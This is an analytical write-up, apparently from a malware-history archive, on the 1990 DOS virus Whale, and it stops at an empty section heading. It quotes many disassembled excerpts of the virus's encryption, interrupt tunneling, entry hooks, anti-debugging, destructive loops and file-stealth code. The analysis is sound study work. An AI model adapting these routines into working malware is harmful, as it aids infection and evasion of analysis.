# Virus.DOS.Whale — techniques and payloads

- [Virus.DOS.Whale — techniques and payloads](#virusdoswhale--techniques-and-payloads)
  - [Virus intro](#virus-intro)
  - [Technically interesting topics](#technically-interesting-topics)
    - [Thirty outer decryptors, varied ciphers and misleading instruction streams](#thirty-outer-decryptors-varied-ciphers-and-misleading-instruction-streams)
    - [Per-routine encryption using return addresses to locate metadata](#per-routine-encryption-using-return-addresses-to-locate-metadata)
    - [An encrypted segment transition](#an-encrypted-segment-transition)
    - [Ciphertext doubling as an encryption-state flag](#ciphertext-doubling-as-an-encryption-state-flag)
    - [Changing instruction identities through opcode patches](#changing-instruction-identities-through-opcode-patches)
    - [Converting the running resident into its disk representation](#converting-the-running-resident-into-its-disk-representation)
    - [A predetermined comparison hidden behind segment aliases](#a-predetermined-comparison-hidden-behind-segment-aliases)
    - [Executable instructions generated on the stack](#executable-instructions-generated-on-the-stack)
    - [A generated DOS-call gateway](#a-generated-dos-call-gateway)
    - [INT 1 and INT 3 used for control flow](#int-1-and-int-3-used-for-control-flow)
    - [Prefetch-dependent execution of modified instructions](#prefetch-dependent-execution-of-modified-instructions)
    - [Private stacks and custom register frames](#private-stacks-and-custom-register-frames)
    - [Tunneling through DOS and BIOS handlers](#tunneling-through-dos-and-bios-handlers)
    - [Five-byte entry hooks and trace-driven restoration](#five-byte-entry-hooks-and-trace-driven-restoration)
    - [Keyboard IRQ masking and temporary NMI redirection](#keyboard-irq-masking-and-temporary-nmi-redirection)
    - [Checksums over code that changes during execution](#checksums-over-code-that-changes-during-execution)
    - [The debugger watchdog and its reuse by the seasonal payload](#the-debugger-watchdog-and-its-reuse-by-the-seasonal-payload)
    - [Redirecting write buffers to frustrate memory dumps](#redirecting-write-buffers-to-frustrate-memory-dumps)
    - [Direct memory allocation and destruction of the discarded copy](#direct-memory-allocation-and-destruction-of-the-discarded-copy)
    - [Clean-file views through handle and FCB reads](#clean-file-views-through-handle-and-fcb-reads)
    - [File-size and timestamp concealment](#file-size-and-timestamp-concealment)
    - [Arithmetic infection markers and extension recognition](#arithmetic-infection-markers-and-extension-recognition)
    - [Paragraph-aligned COM/EXE infection](#paragraph-aligned-comexe-infection)
    - [Intercepting DOS loading and restoring host execution state](#intercepting-dos-loading-and-restoring-host-execution-state)
    - [Deferred infection on close, attribute preservation and error handling](#deferred-infection-on-close-attribute-preservation-and-error-handling)
    - [Randomized fields, padding and memory-derived trailing bytes](#randomized-fields-padding-and-memory-derived-trailing-bytes)
  - [Curiosities](#curiosities)
    - [Propagation stops from April 1991](#propagation-stops-from-april-1991)
    - [The hidden sector backup and its cryptic warning](#the-hidden-sector-backup-and-its-cryptic-warning)
    - [The Pisces message and the supposed 1991 exemption](#the-pisces-message-and-the-supposed-1991-exemption)
    - [TADPOLES, Hamburg and fish wordplay](#tadpoles-hamburg-and-fish-wordplay)

## Virus intro

Whale, also known as Mother Fish and Z the Whale, is a resident DOS virus that infects COM and EXE programs. Catalogued as discovered in August 1990, it attracted attention that autumn for combining file stealth, variable encryption and unusually elaborate resistance to debugging. Its ordinary infection adds 9,216 bytes to a program. In November 1990, *Virus Bulletin* described it as the largest virus researchers had yet encountered and devoted both an analysis and an addendum to its construction. [VSUM entry](../references/vsum/whale.txt), [contemporary analysis](../references/virus_bulletin/199011-p17-whale-a-dinosaur-heading-for-extinction.txt).

Executing an infected program installs Whale in memory, where it intercepts DOS services and the keyboard handler. It can infect programs during execution requests or through a sequence of opening and closing a candidate file. Its concealment extends beyond subtracting the added bytes from directory listings: intercepted reads can expose the original program header and hide the appended virus, while interception of DOS loading repairs the host's execution state. Encryption surrounds both the stored virus and many individual routines as they run. Together, these mechanisms let the physical file, the contents returned to a reader and the instructions executing in memory present different appearances. [Infection dispatch](../listings/Virus.DOS.Whale.asm#L2772), [read interception](../listings/Virus.DOS.Whale.asm#L5213), [loading interception](../listings/Virus.DOS.Whale.asm#L2976).

Whale also illustrates the cost of early virus armouring. Its thirty outer decryptors provide a finite repertoire of mutations, while its frequent decryption, re-encryption, instruction patching and interrupt manipulation add considerable work to routine operations. Contemporary analysts reported conspicuous slowdowns and argued that the protection itself helped reveal an infection. The anonymous claims surrounding “Mother Fish,” including supposed learning and immunity to detection, went well beyond its demonstrated mechanisms. Its fish-themed messages and calendar triggers gave this heavily protected program an equally distinctive presentation. [November 1990 analysis](../references/virus_bulletin/199011-p17-whale-a-dinosaur-heading-for-extinction.txt), [Jonah’s Journey](../references/virus_bulletin/199011-p20-jonahs-journey.txt).

## Technically interesting topics

### Thirty outer decryptors, varied ciphers and misleading instruction streams

Whale carries thirty 76-byte decryptor templates in an encrypted bank. The programmable interval timer (PIT), read at port `40h`, supplies the values used for template selection and many encryption keys. When replacement is enabled and a timer test permits it, this rejection loop chooses an index below thirty and converts it into a byte offset. The selected template is copied into the active slot, and the bank receives a fresh nonzero XOR key. The repertoire is finite; selection can repeat a template. [Template selection](../listings/Virus.DOS.Whale.asm#L4523):

```asm
maybe_select_decoder_template_at_124a:
    IN      AL,pit_counter_zero_port
    CMP     AL,0x1e
    JNC     maybe_select_decoder_template_at_124a
    XOR     AH,AH
    MOV     BX,decoder_template_bytes
    MUL     BX
    ADD     AX,encrypted_template_bank
```

The active decoder transforms 9,093 bytes. Each recovered byte supplies the next byte's key after decrementing it; the byte preceding the region seeds the chain. [Feedback loop](../listings/Virus.DOS.Whale.asm#L6461):

```asm
active_outer_decoder_entry_at_23d8:
    MOV     AL,byte ptr [BX + -0x1]
    DEC     AL
    XOR     byte ptr [BX],AL
    INC     BX
    LOOP    active_outer_decoder_entry_at_23d8
```

Other templates use sparse word XOR, neighboring unchanged bytes, arithmetic transforms and byte swaps. Eight also transform already-executed prefix bytes, restoring them before reuse. The variation extends to misleading instruction streams: template 27 skips one `MOV` and immediately overwrites another, frustrating a simple reading of consecutive instructions. [Cipher variations](../listings/Virus.DOS.Whale.asm#L6956), [prefix transformations](../listings/Virus.DOS.Whale.asm#L6404), [template 27](../listings/Virus.DOS.Whale.asm#L8832):

```asm
    CALL    template_27_decode_entry_at_23c2
    MOV     BX,0x5601
template_27_decode_entry_at_23c2:
    POP     BX
    SUB     BX,0x239f
    MOV     CX,0x8934
    MOV     CX,outer_byte_count_this_template
```

### Per-routine encryption using return addresses to locate metadata

Ninety-five code units use an inline convention: a decoder call is followed by a length byte, a key byte and the protected instructions. The call's return address therefore identifies metadata. After saving the caller's state, the decoder pops that address into `BX`, loads the length into `AL` and key into `AH`, and pushes a continuation two bytes later. Clearing `CH` leaves only the length in `CX`. The eventual return enters the decoded instructions. [Inline decoder](../listings/Virus.DOS.Whale.asm#L5773):

```asm
    POP     BX
    MOV     AX,word ptr CS:[BX]
    ADD     BX,0x2
    PUSH    BX
    MOV     CX,AX
    XOR     CH,CH
decode_inline_length_key_unit_at_212b:
    XOR     byte ptr CS:[BX],AH
    INC     BX
    LOOP    decode_inline_length_key_unit_at_212b
```

At the other end, a re-encryption call uses a trailing backward-span byte to find the same header and skips that descriptor on return. The following loop rejects zero timer samples, stores the next key, and encrypts the body. Ordinary calls consequently change their own stored ciphertext. Nested calls can leave their caller plaintext while another unit runs; the protection operates per unit. [Backward-span handling](../listings/Virus.DOS.Whale.asm#L5890), [key replacement and encryption](../listings/Virus.DOS.Whale.asm#L5900):

```asm
decode_segment_transition_unit_at_219c:
    IN      AL,pit_counter_zero_port
    OR      AL,AL
    JZ      decode_segment_transition_unit_at_219c
    MOV     CX,word ptr CS:[BX]
    XOR     CH,CH
    INC     BX
    MOV     byte ptr CS:[BX],AL
decode_segment_transition_unit_at_21ab:
    INC     BX
    XOR     byte ptr CS:[BX],AL
    LOOP    decode_segment_transition_unit_at_21ab
```

### An encrypted segment transition

A separate 36-byte encrypted unit changes the segment coordinate system used by the bootstrap. A preceding `CALL` supplies the current instruction offset. Multiplication produces `CS × 16` in `DX:AX`; subtracting the normalized return-site offset from the actual return offset supplies the relocation adjustment. Adding that adjustment and dividing by sixteen yields the new segment. [Segment calculation](../listings/Virus.DOS.Whale.asm#L13063):

```asm
    MOV     AX,CS
    MOV     BX,paragraph_bytes
    MUL     BX
    POP     CX
    SUB     CX,segment_transition_plaintext_at_029d
    ADD     AX,CX
    ADC     DX,0x0
    DIV     BX
    PUSH    AX
```

The unit pushes offset `009Bh` after the new segment, encrypts its own 36 bytes, and transfers through `RETF`. Its encryptor also uses `CALL`/`POP` addressing: adding `14h` to the saved return offset locates the decryption instruction's immediate operand, where `AL` stores the next nonzero key. Both the segment transition and its key maintenance derive addresses from the instruction stream. [Far destination](../listings/Virus.DOS.Whale.asm#L13073), [key-operand patch](../listings/Virus.DOS.Whale.asm#L5814):

```asm
    CALL    encrypt_segment_transition_unit_at_215e
encrypt_segment_transition_unit_at_215e:
    POP     BX
    ADD     BX,0x14
    MOV     byte ptr CS:[BX],AL
```

### Ciphertext doubling as an encryption-state flag

An additional XOR layer covers 84 bytes containing the outer decoder and a leading state byte whose plaintext value is zero. One timer read patches the same key into the encryption and decryption instructions. Unlike the per-unit key generator, this read accepts zero. [Paired key operands](../listings/Virus.DOS.Whale.asm#L5989):

```asm
    IN      AL,pit_counter_zero_port
    MOV     CS:[tunneling_int1_handler_at_224b+3],AL
    MOV     CS:[patched_dos_handler_entry_at_2266+3],AL
```

The encryption loop includes the state byte, so that byte becomes the key itself. A zero sample leaves the entire region unchanged. The shown `1Fh` operand is replaced by the sampled key before use. [Encryption loop](../listings/Virus.DOS.Whale.asm#L6018):

```asm
    MOV     BX,outer_template_xor_state
    MOV     CX,0x54
tunneling_int1_handler_at_224b:
    XOR     byte ptr CS:[BX],0x1f
    INC     BX
    LOOP    tunneling_int1_handler_at_224b
```

On DOS entry, `OR` tests that byte without changing it. Zero skips decoding; otherwise the matching XOR loop restores both the code and its zero state. The flag maintains itself through the same operation that protects the instructions. [DOS entry test](../listings/Virus.DOS.Whale.asm#L6044):

```asm
    OR      byte ptr CS:[outer_template_xor_state],0x0
    JZ      patched_dos_handler_entry_at_226f
```

### Changing instruction identities through opcode patches

Whale changes instructions between their stored and executable forms. Its inline decoder dispatch slot initially contains `CMP AX,16D5h`. Bootstrap writes `E9h` over the opcode, turning the same following word into a near-jump displacement. The comparison operand thus has a second purpose waiting for the opcode change. With the bootstrap relocation bias in `SI`, this write targets that slot. [Stored comparison](../listings/Virus.DOS.Whale.asm#L9804), [opcode patch](../listings/Virus.DOS.Whale.asm#L10219):

```asm
    MOV     byte ptr CS:[SI + 0xa33],near_jump_opcode
```

Another write changes an INT 3 byte into CALL, reusing the following bytes as its displacement. More extensive conversion uses an XOR helper: `SI` selects a word of code and `BX` supplies its delta. Applying the same delta again restores the original bytes. [CALL patch](../listings/Virus.DOS.Whale.asm#L9663), [word patch helper](../listings/Virus.DOS.Whale.asm#L2522):

```asm
    XOR     word ptr CS:[SI],BX
    NOP
    RET
```

The caller advances between sixteen sites across the decoder, re-encryptor and tunnel handler. Fifteen deltas change words; one is zero. These mutations make the executable interpretation depend on which initialization or output stage has run. [First patch sites](../listings/Virus.DOS.Whale.asm#L2533):

```asm
    PUSH    BX
    ADD     SI,0x15
    MOV     BX,decoder_word_xor_delta
    CALL    xor_bootstrap_word_at_si
    ADD     SI,0x2
    MOV     BX,0x758b
    CALL    xor_bootstrap_word_at_si
```

### Converting the running resident into its disk representation

Infection turns the live resident body into the representation expected by a newly infected program. The writer reinstates dormant bootstrap opcodes, toggles decoder instruction words and transforms the XOR patch helper itself. It then changes the decoder dispatch jump back into a comparison before entering the outer writer. [Representation switch](../listings/Virus.DOS.Whale.asm#L4118):

```asm
    CALL    toggle_inline_decoder_instruction_patches
    MOV     SI,xor_bootstrap_word_at_si
    XOR     word ptr [SI],patch_helper_xor_delta0
    ADD     SI,0x2
    XOR     word ptr [SI],patch_helper_xor_delta1
    MOV     byte ptr [inline_unit_decode_dispatch],0x3d
    CALL    restore_keyboard_registers_at_239d
```

The selected template encrypts the body in place. Its output path recovers the saved DOS write arguments, writes that encrypted memory and immediately enters the matching decoder. [Write-and-decode sequence](../listings/Virus.DOS.Whale.asm#L6445):

```asm
    MOV     DX,AX
    POP     AX
    MOV     BX,AX
    POP     AX
    XCHG    AX,CX
    CALL    word ptr [dos_call_helper_pointer]
    JMP     active_outer_decoder_entry
```

Mode value one makes decoding return to the writer. The writer then restores the executable dispatch and helper forms; initial loading instead continues into bootstrap. This arrangement reuses the same resident bytes as working code, infection output and decoding input, with the surrounding conversion code keeping those stages reversible. [Mode test](../listings/Virus.DOS.Whale.asm#L6469), [restoration](../listings/Virus.DOS.Whale.asm#L4130):

```asm
    MOV     byte ptr [inline_unit_decode_dispatch],0xe9
    XOR     word ptr [SI],patch_helper_xor_delta1
    SUB     SI,0x2
    XOR     word ptr [SI],patch_helper_xor_delta0
    ADD     SI,0x18d3
    CALL    toggle_inline_decoder_instruction_patches
```

### A predetermined comparison hidden behind segment aliases

Real-mode addresses can look different while referring to the same physical memory. Whale exploits this during bootstrap. With `DS=0020h` and `BX=021Ch`, it reads the BIOS keyboard-buffer tail into `CX`, then halves the high byte of `BX`. That changes the offset to `011Ch`. [First read and offset adjustment](../listings/Virus.DOS.Whale.asm#L9940):

```asm
    MOV     CX,word ptr [BX]
    PUSH    CS
    POP     AX
    SHR     BH,0x1
```

It subsequently advances `DS` by `10h` paragraphs and reads through the adjusted pointer. [Second read and comparison](../listings/Virus.DOS.Whale.asm#L10142):

```asm
    MOV     DX,DS
    POP     AX
    ADD     DX,0x10
    MOV     DS,DX
    MOV     BX,word ptr [BX]
    NEG     BX
    ADD     BX,CX
    JNZ     mask_keyboard_irq_and_install_trace_at_1246
    JZ      mask_keyboard_irq_and_install_trace_at_12a0
```

Both `0020:021C` and `0030:011C` address physical `041Ch`. With the keyboard IRQ masked, the subtraction produces zero and selects the second branch. The surrounding accumulation of BIOS data and changes of segment obscure an equality built into the addresses themselves.

### Executable instructions generated on the stack

Whale turns a pushed constant into a tiny program. During startup, when the code and stack share a segment, it records the stack position and pushes `C353h`. Little-endian storage places bytes `53 C3` in memory: the opcodes for `PUSH BX; RET`. [Stack-code construction](../listings/Virus.DOS.Whale.asm#L9814):

```asm
    MOV     DX,BP
    MOV     BP,SP
    MOV     BX,0xc353
    PUSH    BX
```

A subsequently called worker removes its return address, adds `278h` to derive a destination and transfers to the two bytes on the stack. [Transfer worker](../listings/Virus.DOS.Whale.asm#L9874):

```asm
bootstrap_return_frame_trampoline:
    POP     BX
    ADD     BX,0x278
    PUSH    DX
    SUB     BP,0x2
    JMP     BP
```

The generated `PUSH BX; RET` pushes that calculated destination and immediately consumes it as an instruction pointer. Following ordinary calls and returns therefore misses an essential step: stack data has become executable control-flow machinery.

### A generated DOS-call gateway

Whale's encrypted routines need a convenient way to call its saved DOS service entry. Startup writes the gateway's instruction words directly into working memory. [Gateway constructor](../listings/Virus.DOS.Whale.asm#L1086):

```asm
    MOV     word ptr [dos_call_helper_pointer],generated_dos_call_helper
    POP     BX
    MOV     word ptr [generated_dos_call_helper],0x2e9c
    ADD     BX,0x2
    MOV     word ptr [dos_helper_far_call_opcode],0x1eff
    MOV     word ptr [dos_helper_far_call_operand],dos_service_entry
    PUSH    BX
    MOV     word ptr [dos_helper_return_opcode],0xc3
```

The little-endian words encode `PUSHF`, a CS override, an indirect far call through `dos_service_entry`, and `RET`. `PUSHF` supplies the saved flags expected by an interrupt-style service, while the far call supplies CS:IP. When DOS returns, the final near return takes execution back to the virus routine that called the gateway.

The constructor also manipulates its own caller's return address: `POP BX; ADD BX,2; PUSH BX` skips two misleading bytes after the constructor call. Both the interface to DOS and the continuation around its constructor are manufactured at runtime.

### INT 1 and INT 3 used for control flow

Whale uses the debugging interrupts as participants in normal execution. Its temporary bootstrap INT 1 handler clears TF in the saved flags, replaces interrupt-vector fields and calls a worker that rewrites the surrounding return frames. The INT 3 destination is the unusual two-instruction sequence `AAD D2h; RET`; the surrounding stack manipulation makes that near return part of the intended continuation. [Bootstrap INT 1 handler](../listings/Virus.DOS.Whale.asm#L9173), [INT 3 destination](../listings/Virus.DOS.Whale.asm#L9382).

The frame worker moves return addresses between stack slots instead of simply returning to the interrupted instruction. [Frame manipulation](../listings/Virus.DOS.Whale.asm#L9408):

```asm
    POP     AX
    ADD     word ptr [BP + outer_return_ip_frame_offset],0x7
    XCHG    word ptr [BP + outer_return_ip_frame_offset],BX
    MOV     DX,BX
    XCHG    word ptr [BP + 0x2],BX
```

The resident DOS hook uses another INT 3 transfer. With `DS=0`, it saves the old vector, installs a private target and deliberately raises the interrupt. [Resident dispatch entry](../listings/Virus.DOS.Whale.asm#L5076):

```asm
    PUSH    word ptr [int3_vector_offset]
    PUSH    word ptr [int3_vector_segment]
    PUSH    CS
    POP     word ptr [int3_vector_segment]
    MOV     word ptr [int3_vector_offset],discard_int3_frame
    INT3
```

The target discards the new IP, CS and FLAGS rather than returning through them. [Dispatch trampoline](../listings/Virus.DOS.Whale.asm#L4939):

```asm
discard_int3_frame:
    POP     AX
    POP     BX
    POP     CX
    JMP     patch_write_guard_and_restore_int3
```

The continuation temporarily subtracts `52h` from a stored `C6h` opcode, producing a `JZ` that selects the DOS-write guard when saved AH is `40h`. It then restores both the original INT 3 vector and the dormant opcode before ordinary DOS dispatch. Interrupt frames and instruction bytes jointly encode the route through the handler. [Temporary branch](../listings/Virus.DOS.Whale.asm#L4858).

### Prefetch-dependent execution of modified instructions

Whale changes an imminent `INT 3` into `RET`. The bootstrap obtains a word from its own code, XORs it so that AL becomes `C3h`, and writes that byte over the instruction at the target in BX. [Self-modifying sequence](../listings/Virus.DOS.Whale.asm#L9419):

```asm
    PUSH    word ptr CS:[SI + 0x971]
    POP     AX
    XOR     AX,0x20c
    MOV     byte ptr CS:[BX],AL
    ADD     AX,0x20c
    INT3
```

The last instruction is the byte being replaced. If the processor has already fetched the original `CCh`, it can still execute `INT 3` even though memory now contains `C3h`. Otherwise it executes the replacement `RET`. The two routes use different return machinery before rejoining startup.

*Jonah’s Journey* explained this difference in terms of the 8086 and 8088 instruction queues. It is a striking case in which reading the current instruction bytes does not fully describe the next instruction executed. Whether the author deliberately intended a processor-dependent test is uncertain. [Contemporary discussion](../references/virus_bulletin/199011-p20-jonahs-journey.txt).

### Private stacks and custom register frames

Interception requires preserving a caller's registers while Whale changes its own code and invokes DOS. A helper saves the caller's SS:SP, switches to a stack in the resident segment, saves the register frame there, updates the private-stack pointer and returns to the caller's stack. [Private-stack save](../listings/Virus.DOS.Whale.asm#L1938):

```asm
    MOV     word ptr CS:[helper_saved_sp],SP
    MOV     word ptr CS:[helper_saved_ss],SS
    PUSH    CS
    POP     SS
    MOV     SP,word ptr CS:[private_stack_top]
    CALL    save_register_frame
    MOV     SS,word ptr CS:[helper_saved_ss]
    MOV     word ptr CS:[private_stack_top],SP
    MOV     SP,word ptr CS:[helper_saved_sp]
```

The complementary helper performs restoration on the private stack before returning to the original SS:SP. The register-frame routines have their own unusual convention: they remove their return address into a resident variable, push or pop the register frame, and jump through the saved address. This lets a helper leave saved registers on the selected stack without burying its own return address underneath them. [Private-stack restoration](../listings/Virus.DOS.Whale.asm#L1752), [register-frame convention](../listings/Virus.DOS.Whale.asm#L1844).

### Tunneling through DOS and BIOS handlers

An interrupt vector can point to an interceptor rather than to the underlying service. Whale follows execution through the chain with TF set and inspects the saved CS in its INT 1 handler. It obtains a DOS memory boundary through INT 21/AH=52h, reading the first-MCB segment from the word immediately before the returned list-of-lists pointer. [Boundary acquisition](../listings/Virus.DOS.Whale.asm#L1163).

The handler accepts an execution segment at or below that boundary, or at or above `C000h`, where ROM services may reside. In the intervening range it returns with tracing still active. [Tunnel boundary tests](../listings/Virus.DOS.Whale.asm#L5931):

```asm
    PUSH    BP
    MOV     BP,SP
    PUSH    AX
    CMP     word ptr [BP + interrupt_frame_cs_offset],0xc000
    JNC     tunneling_int1_handler_at_21dd
    MOV     AX,CS:[first_mcb_segment]
    CMP     word ptr [BP + interrupt_frame_cs_offset],AX
    JBE     tunneling_int1_handler_at_21dd
    POP     AX
    POP     BP
    IRET
```

The accepted CS:IP becomes a saved service target. This converts single-stepping from a debugging aid into a way to get beneath previous interception layers. Different tunnel modes can also resume through a saved SS:SP. [Target capture and stack restoration](../listings/Virus.DOS.Whale.asm#L5955).

A conditional startup path, selected by the INT 2F handler's segment, traces the disk-service chain, installs the discovered address as INT 13 and writes `2` to the BIOS hard-disk-count byte at physical `0475h`. That disk-vector replacement is separate from the instruction patches used for DOS and the keyboard. [Conditional disk setup](../listings/Virus.DOS.Whale.asm#L1308).

### Five-byte entry hooks and trace-driven restoration

Whale patches handler instructions without needing to change their interrupt vectors. A five-byte far jump is exchanged with the first five bytes of the selected DOS entry. The same loop both installs the jump and saves the displaced instructions; running it again reverses the exchange. [DOS entry exchange](../listings/Virus.DOS.Whale.asm#L1796):

```asm
    MOV     SI,dos_entry_exchange_buffer
    LES     DI,CS:[dos_service_entry]
    PUSH    CS
    POP     DS
    CLD
    MOV     CX,far_jump_bytes
swap_five_byte_dos_entry_patch_at_0412:
    LODSB
    XCHG    byte ptr ES:[DI],AL
    MOV     byte ptr [SI + -0x1],AL
    INC     DI
    LOOP    swap_five_byte_dos_entry_patch_at_0412
```

Here `far_jump_bytes` is five. The DOS target comes from tunneling; the keyboard target is obtained from its interrupt vector and patched with an equivalent exchange. Looking only for changed vector addresses can therefore miss both hooks. [Keyboard patch construction](../listings/Virus.DOS.Whale.asm#L1238).

For a traced DOS call, Whale restores the original entry bytes and sets adjacent mode/count bytes with the word `0401h`: mode one, countdown four. Once execution reaches a qualifying service segment, the INT 1 handler counts the stops. [Countdown](../listings/Virus.DOS.Whale.asm#L5980):

```asm
    DEC     byte ptr CS:[tunnel_step_count]
    JNZ     tunneling_int1_handler_at_21da
    AND     word ptr [BP + interrupt_frame_flags_offset],clear_trap_flag_mask
```

At zero it rearms the entry patch and encrypts the outer-code region. The keyboard wrapper instead exchanges its patch around a call to the original handler. Both mechanisms allow the original service to run while retaining interception of subsequent calls. [Trace setup](../listings/Virus.DOS.Whale.asm#L5724), [rearming](../listings/Virus.DOS.Whale.asm#L6008), [keyboard wrapper](../listings/Virus.DOS.Whale.asm#L6091).

### Keyboard IRQ masking and temporary NMI redirection

Hook exchanges and code transformations leave transient states that an interrupt could expose. Whale masks the keyboard's IRQ1 through the programmable interrupt controller. Its mask port is `21h`, and bit one controls the keyboard request. [Masking](../listings/Virus.DOS.Whale.asm#L2694):

```asm
    IN      AL,pic_irq_mask_port
    OR      AL,keyboard_irq_mask
    OUT     pic_irq_mask_port,AL
```

It also saves the NMI vector and redirects it to a minimal handler containing `IRET`. The address is calculated from a CALL-derived return address before being installed as vector two. [NMI setup](../listings/Virus.DOS.Whale.asm#L2706), [temporary handler](../listings/Virus.DOS.Whale.asm#L2733).

The paired routine clears the keyboard mask bit and restores the saved NMI address. [Restoration](../listings/Virus.DOS.Whale.asm#L2757):

```asm
    IN      AL,pic_irq_mask_port
    AND     AL,0xfd
    OUT     pic_irq_mask_port,AL
    LDS     DX,CS:[saved_nmi_offset]
    MOV     AL,0x2
    CALL    set_ivt_entry_direct
```

This protection reaches beyond software interrupt vectors: it coordinates hardware interrupt delivery with the lifetime of Whale's changing code and hooks.

### Checksums over code that changes during execution

Whale's startup integrity check XORs sixteen selected ranges into a single byte. `BX` identifies a range, `CX` supplies its length, and `AL` carries the accumulator across calls. The compact inner routine reads each byte through `CS`, making the check cover the virus's code segment directly. [Accumulator](../listings/Virus.DOS.Whale.asm#L3185):

```asm
    XOR     AL,byte ptr CS:[BX]
    INC     BX
    LOOP    xor_accumulate_region
    RET
```

The selection includes skipped bytes, dispatch machinery and code changed by the instruction patcher. For example, this call incorporates 103 bytes beginning at the decoder patch base. The expected value therefore describes a particular execution phase: decrypting or modifying code can change the checksum input even when its intended behavior remains equivalent. [Decoder span](../listings/Virus.DOS.Whale.asm#L3249):

```asm
    MOV     BX,decoder_patch_base
    MOV     CX,0x67
    CALL    xor_accumulate_region
```

After all ranges, `E0h` accepts the expected image. A mismatch enters the failure path, which invokes the anti-debug response. The significance lies in coupling integrity to the current instruction representation, including bytes that ordinary control flow skips. [Final comparison](../listings/Virus.DOS.Whale.asm#L3274):

```asm
    CMP     AL,0xe0
    JZ      xor_accumulate_region_at_0c02
```

### The debugger watchdog and its reuse by the seasonal payload

The keyboard wrapper checks the segments of INT 1 and INT 3 against the first-MCB boundary. A vector at or above that boundary selects the destructive response. [Watchdog tests](../listings/Virus.DOS.Whale.asm#L6281):

```asm
    MOV     BX,word ptr ES:[int1_vector_segment]
    CMP     BX,word ptr CS:[first_mcb_segment]
    JNC     debug_vector_check_and_destructive_exit_at_2317
    MOV     BX,word ptr ES:[int3_vector_segment]
    CMP     BX,word ptr CS:[first_mcb_segment]
    JNC     debug_vector_check_and_destructive_exit_at_2317
```

The selected response changes the DOS patch state, sets the current PSP's termination address to `FFFF:0000` and corrupts the virus body. It applies an OR mask of `0802h` to 4,485 words, starting at body offset `004Fh`. [Destructive loop](../listings/Virus.DOS.Whale.asm#L6336):

```asm
    MOV     CX,0x1185
    MOV     BX,offset build_dos_call_helper+0x2
    MOV     AX,0x802
debug_vector_check_and_destructive_exit_at_235a:
    OR      word ptr CS:[BX],AX
    ADD     BX,0x2
    LOOP    debug_vector_check_and_destructive_exit_at_235a
```

The seasonal payload reuses this response by manufacturing its trigger. After printing its message, it writes two HLT opcodes into working memory, stacks that address as an interrupt-return destination, and makes the INT 1 segment invalid before calling the watchdog. [Payload handoff](../listings/Virus.DOS.Whale.asm#L5187):

```asm
    MOV     word ptr CS:[dos_dispatch_handler_pointer],0xf4f4
    MOV     BX,dos_dispatch_handler_pointer
    PUSHF
    PUSH    CS
    PUSH    BX
    XOR     AX,AX
    MOV     DS,AX
    MOV     word ptr [int1_vector_segment],invalid_trace_segment
    CALL    debug_vector_check_and_destructive_exit
```

`invalid_trace_segment` is `FFFFh`, which forces the vector test to select the response. This connects a user-visible payload to anti-debugging machinery through shared state. The seasonal entry has a different stack and hook context, so execution of the staged HLT instructions is not guaranteed.

### Redirecting write buffers to frustrate memory dumps

Whale's DOS-write guard can change which memory reaches a file. For AH=40h calls with a saved handle of at least four, it compares the caller's buffer segment with a threshold derived from the resident CS. [Write-buffer guard](../listings/Virus.DOS.Whale.asm#L4837):

```asm
    CMP     word ptr CS:[keyboard_saved_bx],0x4
    JC      patch_write_guard_and_restore_int3_at_1caa
    PUSH    CS
    POP     BX
    SUB     BH,0x20
    MOV     AX,CS:[keyboard_saved_ds]
    CMP     AX,BX
    JC      patch_write_guard_and_restore_int3_at_1caa
    MOV     word ptr CS:[keyboard_saved_ds],BX
```

Subtracting `20h` from BH lowers the segment by `2000h` paragraphs, or 128 KiB. When the supplied DS is at or above that threshold, the guard substitutes the lower segment in the saved register frame. It leaves the buffer offset and requested count alone. A program trying to dump the resident image through DOS can therefore receive apparently ordinary write service while different memory is written. The deception operates on the source address of the readout itself.

### Direct memory allocation and destruction of the discarded copy

Whale reserves its resident space by editing DOS's allocation records directly. Starting with ES pointing to the initial PSP, it reduces the PSP's end-of-allocation segment, steps back one paragraph to the owning MCB and reduces that block's size by `resident_paragraphs`, or `0270h` paragraphs: 9,984 bytes. The new segment is calculated from the shortened block. [Allocation code](../listings/Virus.DOS.Whale.asm#L5503).

```asm
    PUSH    ES
    POP     DS
    SUB     word ptr [0x2],resident_paragraphs
    MOV     DX,DS
    DEC     DX
    MOV     DS,DX
    MOV     AX,[mcb_size_offset]
    SUB     AX,resident_paragraphs
    ADD     DX,AX
    MOV     [mcb_size_offset],AX
```

A backward copy moves the complete `2700h`-byte allocation, including helpers, working state and a private stack beyond the file body. Whale then pushes the new segment and continuation offset for a far return. Before taking that return, it sets BX to zero and CX to `236Ch`, destroying the discarded image with this loop. OR changes selected bits irreversibly while leaving the cleanup instructions, located beyond the overwritten span, available to finish the transfer. [Copy and transfer setup](../listings/Virus.DOS.Whale.asm#L5523), [cleanup loop](../listings/Virus.DOS.Whale.asm#L6368).

```asm
    OR      byte ptr CS:[BX],0x15
    INC     BX
    LOOP    debug_vector_check_and_destructive_exit_at_236c
    RETF
```

### Clean-file views through handle and FCB reads

Whale's handle-read interception presents the original host as a logical file. For a marked regular file, it subtracts the ordinary append from the physical size and then subtracts the current position. The result determines whether to return zero bytes or shorten the request at the original EOF. [Logical EOF calculation](../listings/Virus.DOS.Whale.asm#L5247).

```asm
    MOV     AX,CS:[physical_file_size_low]
    MOV     DX,word ptr CS:[physical_file_size_high]
    SUB     AX,virus_append_bytes
    SBB     DX,0x0
    SUB     AX,word ptr CS:[saved_file_position_low]
    SBB     DX,word ptr CS:[saved_file_position_high]
```

Reads covering the first 28 bytes are redirected to the preserved header inside the append. Rounding the infected EOF upward and subtracting `23FCh` locates that header; AX carries the requested offset within it. The handler then resumes ordinary host-data reads and combines the returned counts. [Header substitution](../listings/Virus.DOS.Whale.asm#L5362).

```asm
    ADD     DX,paragraph_rounding_bias
    ADC     CX,0x0
    AND     DX,0xfff0
    SUB     DX,0x23fc
    SBB     CX,0x0
    ADD     DX,AX
    ADC     CX,0x0
```

The older FCB interface needs separate machinery. Whale copies the caller's FCB, calculates the saved-header location as a random-record number and temporarily uses one-byte records. An FCB random block read can then retrieve exactly 28 header bytes, independently of the caller's record size. [FCB header retrieval](../listings/Virus.DOS.Whale.asm#L2501).

```asm
    MOV     word ptr [DI + fcb_random_record_high_offset],DX
    MOV     word ptr [DI + fcb_random_record_low_offset],AX
    MOV     CX,0x1c
    MOV     word ptr [DI + 0xe],0x1
    MOV     AH,0x27
    MOV     DX,DI
    CALL    word ptr CS:[dos_call_helper_pointer]
```

### File-size and timestamp concealment

